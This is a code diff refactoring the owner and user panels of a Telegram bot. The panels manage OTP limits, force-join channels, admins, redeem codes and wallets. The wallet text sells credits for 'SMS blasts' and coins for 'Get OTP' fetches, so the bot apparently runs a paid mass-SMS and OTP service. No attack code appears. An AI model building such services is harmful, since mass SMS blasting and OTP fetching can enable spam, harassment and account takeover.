     await state.update_data(otplimit_target_uid=target)
     cur = get_user_otp_limit(target, d)
     cs = "Unlimited" if cur is None else ("🚫 BLOCKED" if cur <= 0 else f"{cur}")
     await state.set_state(S.set_otp_limit_value)
-    await m.answer(f"{em(EMOJI_OTP, '🔐')} Current: <b>{cs}</b>\n\nNumber / <code>off</code>",
+    await m.answer(f"🔐 Current: <b>{cs}</b>\n\nNumber / <code>off</code>",
                    reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")
 
 @R.message(S.set_otp_limit_value)
-async def set_otplimit_val_done(m: Message, state: FSMContext):
+async def set_otplimit_val_done(m, state):
     d = load()
     if not is_owner(m.from_user.id, d):
         await state.clear(); return
     txt = (m.text or "").strip().lower()
     fsmd = await state.get_data(); target = fsmd.get("otplimit_target_uid")
     if target is None:
-        await state.clear(); await m.answer(f"{em(EMOJI_CROSS, '❌')} Expired.", parse_mode="HTML"); return
+        await state.clear()
+        await m.answer(f"❌ Expired.", reply_markup=owner_kb(d), parse_mode="HTML"); return
     if txt in ("off", "unlimited", "remove", "none", "reset"):
         set_user_otp_limit(target, None, d); save(); await state.clear()
-        await m.answer(f"{em(EMOJI_CHECK, '✅')} Unlimited", reply_markup=owner_kb(d), parse_mode="HTML"); return
+        await m.answer(f"✅ Unlimited", reply_markup=owner_kb(d), parse_mode="HTML"); return
     try:
         lv = int(txt)
         if lv < 0: raise ValueError
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Invalid.", parse_mode="HTML"); return
+        await m.answer(f"❌ Invalid.", parse_mode="HTML"); return
     set_user_otp_limit(target, lv, d); save(); await state.clear()
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} <code>{target}</code> → {lv}",
-                   reply_markup=owner_kb(d), parse_mode="HTML")
+    await m.answer(f"✅ <code>{target}</code> → {lv}", reply_markup=owner_kb(d), parse_mode="HTML")
 
 @R.callback_query(F.data == "owner:list_limits")
-async def list_limits(cq: CallbackQuery, state: FSMContext):
+async def list_limits(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
-    lines = [f"{em(EMOJI_LOCK, '📋')} <b>All Limits</b>\n"]
+    lines = [f"🔒 <b>All Limits</b>\n"]
     count = 0
     for us, u in d.get("users", {}).items():
         lim = u.get("max_send_limit"); olim = u.get("max_otp_limit")
@@ -3197,62 +3242,58 @@ async def list_limits(cq: CallbackQuery, state: FSMContext):
 
 # ----- FORCE JOIN -----
 @R.callback_query(F.data == "owner:fj:menu")
-async def fj_menu(cq: CallbackQuery, state: FSMContext):
+async def fj_menu(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     fj = d.get("force_join", {}); chs = fj.get("channels", [])
-    st = f"{em(EMOJI_CHECK, '🟢')} ON" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} OFF"
-    txt = f"{em(EMOJI_BELL, '🔗')} <b>Force Join</b>\n\nStatus: {st}\nChannels: <b>{len(chs)}</b>\n\n"
+    st = "🟢 ON" if fj.get("enabled") else "🔴 OFF"
+    txt = f"🔗 <b>Force Join</b>\n\nStatus: {st}\nChannels: <b>{len(chs)}</b>\n\n"
     for c in chs: txt += f"• {esc(c.get('title', 'Channel'))} (<code>{esc(c['id'])}</code>)\n"
     rows = [
         [btn("add channel", "owner:fj:add", EMOJI_PLUS, "➕")],
         [btn("remove channel", "owner:fj:remove", EMOJI_CROSS, "🗑")],
-        [InlineKeyboardButton(
-            text=f"🟢 {sc('enable')}" if not fj.get("enabled") else f"🔴 {sc('disable')}",
-            callback_data="owner:fj:toggle")],
+        [InlineKeyboardButton(text="🟢 enable" if not fj.get("enabled") else "🔴 disable", callback_data="owner:fj:toggle")],
         [btn("back", "owner:home", EMOJI_GEAR, "🔙")]
     ]
     await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))
 
 @R.callback_query(F.data == "owner:fj:add")
-async def fj_add_start(cq: CallbackQuery, state: FSMContext):
+async def fj_add_start(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.fj_add_channel)
-    await safe_edit(cq, f"{em(EMOJI_BELL, '🔗')} <b>Add Channel</b>\n\nStep 1/2: ID:",
-                    kb([(f"{sc('cancel')}", "owner:fj:menu")]))
+    await safe_edit(cq, f"🔗 <b>Add Channel</b>\n\nStep 1/2: ID:", kb([(f"{sc('cancel')}", "owner:fj:menu")]))
 
 @R.message(S.fj_add_channel)
-async def fj_add_channel_done(m: Message, state: FSMContext):
+async def fj_add_channel_done(m, state):
     d = load()
     if not is_owner(m.from_user.id, d):
         await state.clear(); return
     try: cid = int((m.text or "").strip())
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID.", parse_mode="HTML"); return
+        await m.answer(f"❌ Valid ID.", parse_mode="HTML"); return
     await state.update_data(fj_channel_id=cid)
     await state.set_state(S.fj_add_link)
-    await m.answer(f"{em(EMOJI_BELL, '🔗')} <b>Step 2/2</b>\n\nInvite link:",
-                   reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]), parse_mode="HTML")
+    await m.answer(f"🔗 <b>Step 2/2</b>\n\nInvite link:", reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]), parse_mode="HTML")
 
 @R.message(S.fj_add_link)
-async def fj_add_link_done(m: Message, state: FSMContext):
+async def fj_add_link_done(m, state):
     d = load()
     if not is_owner(m.from_user.id, d):
         await state.clear(); return
     link = (m.text or "").strip()
     if not link.startswith("http"):
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid link.", parse_mode="HTML"); return
+        await m.answer(f"❌ Valid link.", parse_mode="HTML"); return
     fsmd = await state.get_data(); cid = str(fsmd.get("fj_channel_id"))
     try:
         ch = await m.bot.get_chat(int(cid)); title = ch.title or "Channel"
@@ -3261,14 +3302,13 @@ async def fj_add_link_done(m: Message, state: FSMContext):
     chs = [c for c in chs if str(c["id"]) != cid]
     chs.append({"id": cid, "link": link, "title": title, "required": True})
     d["force_join"]["channels"] = chs; save(); await state.clear()
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} Added: {esc(title)}",
-                   reply_markup=kb([(f"{sc('back')}", "owner:fj:menu")]), parse_mode="HTML")
+    await m.answer(f"✅ Added: {esc(title)}", reply_markup=kb([(f"{sc('back')}", "owner:fj:menu")]), parse_mode="HTML")
 
 @R.callback_query(F.data == "owner:fj:remove")
-async def fj_remove_menu(cq: CallbackQuery, state: FSMContext):
+async def fj_remove_menu(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     chs = d.get("force_join", {}).get("channels", [])
@@ -3282,14 +3322,13 @@ async def fj_remove_menu(cq: CallbackQuery, state: FSMContext):
     for c in chs:
         rows.append([btn(f"{c.get('title', 'Channel')[:25]}", f"owner:fj:del:{c['id']}", EMOJI_CROSS, "🗑")])
     rows.append([btn("back", "owner:fj:menu", EMOJI_GEAR, "🔙")])
-    await safe_edit(cq, f"{em(EMOJI_CROSS, '🗑')} <b>Remove</b>",
-                    InlineKeyboardMarkup(inline_keyboard=rows))
+    await safe_edit(cq, f"🗑 <b>Remove</b>", InlineKeyboardMarkup(inline_keyboard=rows))
 
 @R.callback_query(F.data.startswith("owner:fj:del:"))
-async def fj_del(cq: CallbackQuery, state: FSMContext):
+async def fj_del(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     cid = cq.data.split("owner:fj:del:", 1)[1]
@@ -3300,10 +3339,10 @@ async def fj_del(cq: CallbackQuery, state: FSMContext):
     await fj_menu(cq, state)
 
 @R.callback_query(F.data == "owner:fj:toggle")
-async def fj_toggle(cq: CallbackQuery, state: FSMContext):
+async def fj_toggle(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     fj = d.setdefault("force_join", {})
@@ -3312,172 +3351,144 @@ async def fj_toggle(cq: CallbackQuery, state: FSMContext):
     except Exception: pass
     await fj_menu(cq, state)
 
-# ----- PRICING -----
-@R.callback_query(F.data == "owner:pricing:menu")
-async def pricing_menu(cq: CallbackQuery, state: FSMContext):
+# ----- OWNERS / ADMINS -----
+@R.callback_query(F.data == "owner:owners:menu")
+async def owners_menu(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
-    plans = d.get("pricing", {}).get("plans", [])
-    txt = f"{em(EMOJI_MONEY, '💳')} <b>Pricing Plans</b>\n\nTotal: <b>{len(plans)}</b>\n\n"
-    for i, p in enumerate(plans, 1):
-        cur = p.get("currency", "credits")
-        amt = p.get("credits", 0) if cur == "credits" else p.get("coins", 0)
-        icon = "💰" if cur == "credits" else "🪙"
-        txt += f"{i}. <b>{esc(p['name'])}</b>\n   {p['price']} INR = {amt} {icon}\n   {esc(p['payment_link'])}\n\n"
-    rows = [
-        [btn("add plan", "owner:pricing:add", EMOJI_PLUS, "➕")],
-        [btn("remove plan", "owner:pricing:remove", EMOJI_CROSS, "🗑")],
-        [btn("back", "owner:home", EMOJI_GEAR, "🔙")]
-    ]
-    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))
+    await safe_edit(cq, f"👑 <b>Super Admins</b>\n\nTotal: <b>{len(d.get('owners', []))}/6</b>", owners_menu_kb(d))
 
-@R.callback_query(F.data == "owner:pricing:add")
-async def pricing_add_start(cq: CallbackQuery, state: FSMContext):
+@R.callback_query(F.data == "owner:owners:add")
+async def owners_add_start(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
+        except Exception: pass
+        return
+    if len(d.get("owners", [])) >= 6:
+        try: await cq.answer("❌ Max 6!")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
-    await state.set_state(S.add_plan_name)
-    await safe_edit(cq, f"{em(EMOJI_MONEY, '💳')} <b>Add Plan</b>\n\nStep 1/5: Name:",
-                    kb([(f"{sc('cancel')}", "owner:pricing:menu")]))
+    await state.set_state(S.add_owner)
+    await safe_edit(cq, f"👑 <b>Add Super Admin</b>\n\nChat ID:", kb([(f"{sc('cancel')}", "owner:owners:menu")]))
 
-@R.message(S.add_plan_name)
-async def pricing_name(m: Message, state: FSMContext):
-    if not is_owner(m.from_user.id, load()):
-        await state.clear(); return
-    nm = (m.text or "").strip()[:64]
-    if not nm:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML"); return
-    await state.update_data(plan_name=nm)
-    await state.set_state(S.add_plan_price)
-    await m.answer("Step 2/5: Price (INR):", parse_mode="HTML")
-
-@R.message(S.add_plan_price)
-async def pricing_price(m: Message, state: FSMContext):
-    if not is_owner(m.from_user.id, load()):
-        await state.clear(); return
-    try:
-        p = float((m.text or "").strip())
-        if p < 0: raise ValueError
-        await state.update_data(plan_price=p)
-    except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid.", parse_mode="HTML"); return
-    await state.set_state(S.add_plan_currency)
-    await m.answer("Step 3/5: Type <code>credits</code> ya <code>coins</code>:", parse_mode="HTML")
-
-@R.message(S.add_plan_currency)
-async def pricing_currency(m: Message, state: FSMContext):
-    if not is_owner(m.from_user.id, load()):
-        await state.clear(); return
-    c = (m.text or "").strip().lower()
-    if c not in ("credits", "coins"):
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Type credits or coins.", parse_mode="HTML"); return
-    await state.update_data(plan_currency=c)
-    if c == "credits":
-        await state.set_state(S.add_plan_credits)
-        await m.answer("Step 4/5: Credits amount:")
-    else:
-        await state.set_state(S.add_plan_coins)
-        await m.answer("Step 4/5: Coins amount:")
-
-@R.message(S.add_plan_credits)
-async def pricing_credits(m: Message, state: FSMContext):
-    if not is_owner(m.from_user.id, load()):
-        await state.clear(); return
-    try:
-        c = int((m.text or "").strip())
-        if c <= 0: raise ValueError
-        await state.update_data(plan_credits=c)
-    except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid.", parse_mode="HTML"); return
-    await state.set_state(S.add_plan_link)
-    await m.answer("Step 5/5: Payment link:")
-
-@R.message(S.add_plan_coins)
-async def pricing_coins(m: Message, state: FSMContext):
-    if not is_owner(m.from_user.id, load()):
-        await state.clear(); return
-    try:
-        c = int((m.text or "").strip())
-        if c <= 0: raise ValueError
-        await state.update_data(plan_coins=c)
-    except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid.", parse_mode="HTML"); return
-    await state.set_state(S.add_plan_link)
-    await m.answer("Step 5/5: Payment link:")
-
-@R.message(S.add_plan_link)
-async def pricing_link(m: Message, state: FSMContext):
+@R.message(S.add_owner)
+async def owners_add_done(m, state):
     d = load()
     if not is_owner(m.from_user.id, d):
         await state.clear(); return
-    link = (m.text or "").strip()
-    if not link.startswith("http"):
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid URL.", parse_mode="HTML"); return
-    fsmd = await state.get_data()
-    plan = {"id": str(int(time.time() * 1000)), "name": fsmd.get("plan_name", "Plan"),
-            "price": fsmd.get("plan_price", 0), "currency": fsmd.get("plan_currency", "credits"),
-            "credits": fsmd.get("plan_credits", 0), "coins": fsmd.get("plan_coins", 0),
-            "payment_link": link}
-    d.setdefault("pricing", {}).setdefault("plans", []).append(plan); save(); await state.clear()
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} Added!",
-                   reply_markup=kb([(f"{sc('back')}", "owner:pricing:menu")]), parse_mode="HTML")
+    try: nid = int((m.text or "").strip())
+    except Exception:
+        await m.answer(f"❌ Valid ID.", parse_mode="HTML"); return
+    if is_owner(nid, d):
+        await state.clear()
+        await m.answer(f"⚠️ Already!", reply_markup=owners_menu_kb(d), parse_mode="HTML"); return
+    if len(d.get("owners", [])) >= 6:
+        await state.clear()
+        await m.answer(f"❌ Max 6!", reply_markup=owners_menu_kb(d), parse_mode="HTML"); return
+    d["owners"].append(nid); save(); await state.clear()
+    await m.answer(f"✅ <code>{nid}</code>", reply_markup=owners_menu_kb(load()), parse_mode="HTML")
+    try: await m.bot.send_message(nid, f"👑 <b>Super Admin!</b>", parse_mode="HTML")
+    except Exception: pass
 
-@R.callback_query(F.data == "owner:pricing:remove")
-async def pricing_remove(cq: CallbackQuery, state: FSMContext):
-    d = load()
-    if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+@R.callback_query(F.data.startswith("owner:owners:del:"))
+async def owners_del(cq, state):
+    d = load(); uid = cq.from_user.id
+    try: did = int(cq.data.split("owner:owners:del:", 1)[1])
+    except Exception:
+        try: await cq.answer("❌")
         except Exception: pass
         return
-    plans = d.get("pricing", {}).get("plans", [])
-    if not plans:
-        try: await cq.answer("❌ None!")
+    if not is_owner(uid, d):
+        try: await cq.answer("🚫")
+        except Exception: pass
+        return
+    if did == MAIN_OWNER or did in SUPER_ADMINS:
+        try: await cq.answer("❌ Can't remove!")
+        except Exception: pass
+        return
+    if did in d["owners"]:
+        d["owners"].remove(did); save()
+        try: await cq.answer("🗑 Removed!")
+        except Exception: pass
+    await owners_menu(cq, state)
+
+@R.callback_query(F.data == "owner:admins:menu")
+async def admins_menu(cq, state):
+    d = load()
+    if not is_owner(cq.from_user.id, d):
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
-    rows = []
-    for p in plans:
-        rows.append([btn(p['name'][:25], f"owner:pricing:del:{p['id']}", EMOJI_CROSS, "🗑")])
-    rows.append([btn("back", "owner:pricing:menu", EMOJI_GEAR, "🔙")])
-    await safe_edit(cq, f"{em(EMOJI_CROSS, '🗑')} <b>Remove</b>",
-                    InlineKeyboardMarkup(inline_keyboard=rows))
+    await safe_edit(cq, f"🛡 <b>Admins</b>\n\nTotal: <b>{len(d.get('admins', []))}</b>", admins_menu_kb(d))
 
-@R.callback_query(F.data.startswith("owner:pricing:del:"))
-async def pricing_del(cq: CallbackQuery, state: FSMContext):
+@R.callback_query(F.data == "owner:admins:add")
+async def admins_add_start(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
-    pid = cq.data.split("owner:pricing:del:", 1)[1]
-    plans = d.get("pricing", {}).get("plans", [])
-    d["pricing"]["plans"] = [p for p in plans if p["id"] != pid]; save()
-    try: await cq.answer("🗑 Removed!")
+    try: await cq.answer()
     except Exception: pass
-    await pricing_menu(cq, state)
+    await state.set_state(S.add_admin)
+    await safe_edit(cq, f"🛡 <b>Add Admin</b>\n\nUser ID:", kb([(f"{sc('cancel')}", "owner:admins:menu")]))
+
+@R.message(S.add_admin)
+async def admins_add_done(m, state):
+    d = load()
+    if not is_owner(m.from_user.id, d):
+        await state.clear(); return
+    try: nid = int((m.text or "").strip())
+    except Exception:
+        await m.answer(f"❌ Valid ID.", parse_mode="HTML"); return
+    if nid in d.get("admins", []) or is_owner(nid, d):
+        await state.clear()
+        await m.answer(f"⚠️ Already!", reply_markup=admins_menu_kb(d), parse_mode="HTML"); return
+    d["admins"].append(nid); save(); await state.clear()
+    await m.answer(f"✅ <code>{nid}</code>", reply_markup=admins_menu_kb(load()), parse_mode="HTML")
+    try: await m.bot.send_message(nid, f"🛡 <b>Admin!</b>", parse_mode="HTML")
+    except Exception: pass
+
+@R.callback_query(F.data.startswith("owner:admins:del:"))
+async def admins_del(cq, state):
+    d = load()
+    if not is_owner(cq.from_user.id, d):
+        try: await cq.answer("🚫")
+        except Exception: pass
+        return
+    try: did = int(cq.data.split("owner:admins:del:", 1)[1])
+    except Exception:
+        try: await cq.answer("❌")
+        except Exception: pass
+        return
+    if did in d.get("admins", []):
+        d["admins"].remove(did); save()
+        try: await cq.answer("🗑 Removed!")
+        except Exception: pass
+    await admins_menu(cq, state)
 
 # ----- REDEEM -----
 @R.callback_query(F.data == "owner:redeem:menu")
-async def redeem_menu(cq: CallbackQuery, state: FSMContext):
+async def redeem_menu(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     codes = d.get("redeem_codes", {})
-    txt = f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Codes</b>\n\nTotal: <b>{len(codes)}</b>\n\n"
+    txt = f"🎁 <b>Redeem Codes</b>\n\nTotal: <b>{len(codes)}</b>\n\n"
     for code, cd in list(codes.items())[:10]:
         st = "✅" if cd.get("uses_left", 0) > 0 else "❌"
         cur = cd.get("currency", "credits")
@@ -3491,33 +3502,32 @@ async def redeem_menu(cq: CallbackQuery, state: FSMContext):
     await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))
 
 @R.callback_query(F.data == "owner:redeem:gen")
-async def redeem_gen_start(cq: CallbackQuery, state: FSMContext):
+async def redeem_gen_start(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.gen_redeem_currency)
     await safe_edit(cq,
-        f"{em(EMOJI_GIFT, '🎁')} <b>Generate Redeem</b>\n\nStep 1/3: Currency\n"
-        f"Type <code>credits</code> or <code>coins</code>",
+        f"🎁 <b>Generate Redeem</b>\n\nStep 1/3: <code>credits</code> ya <code>coins</code>",
         kb([(f"{sc('cancel')}", "owner:redeem:menu")]))
 
 @R.message(S.gen_redeem_currency)
-async def redeem_currency(m: Message, state: FSMContext):
+async def redeem_currency(m, state):
     if not is_owner(m.from_user.id, load()):
         await state.clear(); return
     c = (m.text or "").strip().lower()
     if c not in ("credits", "coins"):
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} credits / coins.", parse_mode="HTML"); return
+        await m.answer(f"❌ credits / coins.", parse_mode="HTML"); return
     await state.update_data(gen_currency=c)
     await state.set_state(S.gen_redeem_credits)
     await m.answer(f"Step 2/3: Amount ({c}):")
 
 @R.message(S.gen_redeem_credits)
-async def redeem_credits(m: Message, state: FSMContext):
+async def redeem_credits(m, state):
     if not is_owner(m.from_user.id, load()):
         await state.clear(); return
     try:
@@ -3525,12 +3535,12 @@ async def redeem_credits(m: Message, state: FSMContext):
         if c <= 0: raise ValueError
         await state.update_data(gen_credits=c)
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid.", parse_mode="HTML"); return
+        await m.answer(f"❌ Valid.", parse_mode="HTML"); return
     await state.set_state(S.gen_redeem_uses)
     await m.answer("Step 3/3: Uses:")
 
 @R.message(S.gen_redeem_uses)
-async def redeem_uses(m: Message, state: FSMContext):
+async def redeem_uses(m, state):
     d = load()
     if not is_owner(m.from_user.id, d):
         await state.clear(); return
@@ -3538,7 +3548,7 @@ async def redeem_uses(m: Message, state: FSMContext):
         u = int((m.text or "").strip())
         if u < 1: raise ValueError
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid.", parse_mode="HTML"); return
+        await m.answer(f"❌ Valid.", parse_mode="HTML"); return
     fsmd = await state.get_data()
     credits = fsmd.get("gen_credits", 10); currency = fsmd.get("gen_currency", "credits")
     for _ in range(20):
@@ -3550,15 +3560,14 @@ async def redeem_uses(m: Message, state: FSMContext):
         "created_by": m.from_user.id, "created_at": now_ts(), "used_by": []
     }
     save(); await state.clear()
-    await m.answer(f"{em(EMOJI_GIFT, '🎉')} <b>Code!</b>\n\n<code>{esc(code)}</code>\n"
-                   f"{credits} {currency}\n🔢 {u}",
+    await m.answer(f"🎉 <b>Code!</b>\n\n<code>{esc(code)}</code>\n{credits} {currency}\n🔢 {u}",
                    reply_markup=kb([(f"{sc('back')}", "owner:redeem:menu")]), parse_mode="HTML")
 
 @R.callback_query(F.data == "owner:redeem:del")
-async def redeem_del_menu(cq: CallbackQuery, state: FSMContext):
+async def redeem_del_menu(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     codes = d.get("redeem_codes", {})
@@ -3572,14 +3581,13 @@ async def redeem_del_menu(cq: CallbackQuery, state: FSMContext):
     for code in list(codes.keys())[:20]:
         rows.append([btn(code, f"owner:redeem:deldo:{code}", EMOJI_CROSS, "🗑")])
     rows.append([btn("back", "owner:redeem:menu", EMOJI_GEAR, "🔙")])
-    await safe_edit(cq, f"{em(EMOJI_CROSS, '🗑')} <b>Delete</b>",
-                    InlineKeyboardMarkup(inline_keyboard=rows))
+    await safe_edit(cq, f"🗑 <b>Delete</b>", InlineKeyboardMarkup(inline_keyboard=rows))
 
 @R.callback_query(F.data.startswith("owner:redeem:deldo:"))
-async def redeem_del_do(cq: CallbackQuery, state: FSMContext):
+async def redeem_del_do(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     code = cq.data.split("owner:redeem:deldo:", 1)[1]
@@ -3591,29 +3599,25 @@ async def redeem_del_do(cq: CallbackQuery, state: FSMContext):
 
 # ----- USER REDEEM -----
 @R.callback_query(F.data == "user:redeem")
-async def redeem_user_start(cq: CallbackQuery, state: FSMContext):
+async def redeem_user_start(cq, state):
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.redeem_code)
-    await safe_edit(cq, f"{em(EMOJI_GIFT, '🎁')} <b>Redeem</b>\n\nCode:",
-                    kb([(f"{sc('cancel')}", "user:home")]))
+    await safe_edit(cq, f"🎁 <b>Redeem</b>\n\nCode:", kb([(f"{sc('cancel')}", "user:home")]))
 
 @R.message(S.redeem_code)
-async def redeem_user_done(m: Message, state: FSMContext):
+async def redeem_user_done(m, state):
     d = load(); uid = m.from_user.id
     code = (m.text or "").strip().upper()
     await state.clear()
     codes = d.get("redeem_codes", {})
     if code not in codes:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Invalid!",
-                       reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
+        await m.answer(f"❌ Invalid!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
     cd = codes[code]
     if cd.get("uses_left", 0) <= 0:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Expired!",
-                       reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
+        await m.answer(f"❌ Expired!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
     if uid in cd.get("used_by", []):
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Already!",
-                       reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
+        await m.answer(f"❌ Already!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
     c = cd["credits"]; cur = cd.get("currency", "credits")
     if cur == "coins": add_coins(uid, c, d, False)
     else: add_credits(uid, c, d, False)
@@ -3621,13 +3625,12 @@ async def redeem_user_done(m: Message, state: FSMContext):
     cd.setdefault("used_by", []).append(uid)
     save()
     ic = "🪙" if cur == "coins" else "💰"
-    await m.answer(f"{em(EMOJI_GIFT, '🎉')} <b>+{c} {cur}</b> {ic}\nBalance: "
-                   f"💰{get_user_credits(uid, d)} 🪙{get_user_coins(uid, d)}",
+    await m.answer(f"🎉 <b>+{c} {cur}</b> {ic}\nBalance: 💰{get_user_credits(uid, d)} 🪙{get_user_coins(uid, d)}",
                    reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
 
 # ----- REFER -----
 @R.callback_query(F.data == "user:refer")
-async def user_refer(cq: CallbackQuery, state: FSMContext):
+async def user_refer(cq, state):
     d = load(); uid = cq.from_user.id
     code = generate_refer_code(uid, d); save()
     try: await cq.answer()
@@ -3638,59 +3641,49 @@ async def user_refer(cq: CallbackQuery, state: FSMContext):
     except Exception: me = None
     un = me.username if me else "bot"
     await safe_edit(cq,
-        f"{em(EMOJI_USER, '👥')} <b>Referral</b>\n\n"
-        f"Each referral = <b>{rc} credits + {rcoin} coins</b>!\n\n"
-        f"{em(EMOJI_GIFT, '🎁')} <code>{esc(code)}</code>\n\n"
-        f"{em(EMOJI_GEAR, '🔗')} https://t.me/{un}?start={code}",
+        f"👥 <b>Referral</b>\n\nEach = <b>{rc} credits + {rcoin} coins</b>!\n\n"
+        f"🎁 <code>{esc(code)}</code>\n\n🔗 https://t.me/{un}?start={code}",
         kb([(f"{sc('back')}", "user:home")]))
 
 # ----- WALLET -----
 @R.callback_query(F.data == "user:wallet")
-async def user_wallet(cq: CallbackQuery, state: FSMContext):
+async def user_wallet(cq, state):
     d = load(); uid = cq.from_user.id
     try: await cq.answer()
     except Exception: pass
     cr = get_user_credits(uid, d); co = get_user_coins(uid, d)
     await safe_edit(cq,
-        f"{em(EMOJI_MONEY, '💳')} <b>My Wallet</b>\n\n"
-        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{cr}</b>\n"
-        f"  <i>Used for SMS blasts</i>\n\n"
-        f"{em(EMOJI_COIN, '🪙')} Coins: <b>{co}</b>\n"
-        f"  <i>Used for Get OTP ({get_otp_cost(d)} per fetch)</i>",
+        f"💳 <b>My Wallet</b>\n\n💰 Credits: <b>{cr}</b>\n  <i>SMS blasts</i>\n\n"
+        f"🪙 Coins: <b>{co}</b>\n  <i>Get OTP ({get_otp_cost(d)} each)</i>",
         wallet_kb())
 
 @R.callback_query(F.data == "user:coin_ledger")
-async def user_coin_ledger(cq: CallbackQuery, state: FSMContext):
+async def user_coin_ledger(cq, state):
     d = load(); uid = cq.from_user.id
     try: await cq.answer()
     except Exception: pass
     hist = d.get("otp_history", {}).get(str(uid), [])
-    lines = [f"{em(EMOJI_COIN, '🪙')} <b>Coin Usage</b>\n"]
-    if not hist:
-        lines.append("<i>No coin usage yet.</i>")
+    lines = [f"🪙 <b>Coin Usage</b>\n"]
+    if not hist: lines.append("<i>No usage yet.</i>")
     else:
         for e in reversed(hist[-20:]):
-            ts = fmt_time(e.get("timestamp", 0))
-            cost = e.get("cost", 0)
-            otp = e.get("otp", "?")
+            ts = fmt_time(e.get("timestamp", 0)); cost = e.get("cost", 0); otp = e.get("otp", "?")
             lines.append(f"🔐 {otp} — 🪙-{cost} [{ts}]")
     await safe_edit(cq, "\n".join(lines), kb([(f"{sc('back')}", "user:wallet")]))
 
 # ----- TRANSFER -----
 @R.callback_query(F.data == "user:transfer:menu")
-async def transfer_menu(cq: CallbackQuery, state: FSMContext):
+async def transfer_menu(cq, state):
     try: await cq.answer()
     except Exception: pass
-    await safe_edit(cq,
-        f"{em(EMOJI_MONEY, '💸')} <b>Transfer</b>\n\nKya transfer karna hai?",
+    await safe_edit(cq, f"💸 <b>Transfer</b>\n\nKya transfer karna hai?",
         InlineKeyboardMarkup(inline_keyboard=[
             [btn("💰 credits", "user:transfer:credits", EMOJI_MONEY, "💰", style="primary"),
              btn("🪙 coins", "user:transfer:coins", EMOJI_COIN, "🪙", style="primary")],
